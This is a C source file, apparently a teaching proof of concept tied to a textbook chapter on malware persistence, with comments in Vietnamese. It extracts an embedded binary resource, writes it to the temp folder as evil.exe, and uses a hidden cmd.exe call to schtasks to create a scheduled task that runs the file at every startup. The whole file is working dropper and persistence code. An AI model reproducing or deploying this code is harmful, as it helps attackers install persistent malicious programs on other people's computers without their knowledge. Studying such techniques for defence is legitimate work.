#include "resource.h"
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

/*
** Mô tả:
** - Tạo Scheduled Task để chạy malware theo những khoảng thời gian nhất định
** PoC:
** - Dropped executable vào thư mục %TEMP%
** - Lập lịch chạy tệp này
** - Có thể sử dụng: CreateProcess, ShellExecute hoặc WinExec
** Ref:
** 1. Chapter 7. Malware Functionalities and Persistence
** 2. Execute command using Win32
	https://stackoverflow.com/a/31564964
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfA(filePath, TEXT("%sevil.exe"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_NEW,				// create new file only
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%s\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%s\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%s\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%s\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Persistence via Scheduled Task ***
	// Complete command: %Windir%\System32\cmd.exe /C schtasks /create /tn EvilSoftware /tr %TEMP%\evil.exe /sc ONSTART /f
	LPCSTR		lpApplicationName = "C:\\Windows\\System32\\cmd.exe";
	LPSTR		lpCommandLine = "/C schtasks /create /tn EvilSoftware /tr %TEMP%\\evil.exe /sc ONSTART /f";

	Sleep(500);
	printf(" [+] Setting up Persistence via Scheduled Task.\n");
	HINSTANCE status = ShellExecute(NULL, "open", lpApplicationName, lpCommandLine, NULL, SW_HIDE);
	if ((DWORD)status <= 32) {
		printf(" [-] Failed to create Scheduled Task. Code = %d\n", GetLastError());
		return;
	}
	/*
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;
	BOOL status = CreateProcess(lpApplicationName, lpCommandLine, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);
	if (status == FALSE) {
		printf(" [-] Failed to create Scheduled Task. Code = %d\n", GetLastError());
		return;
	}
	*/
	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}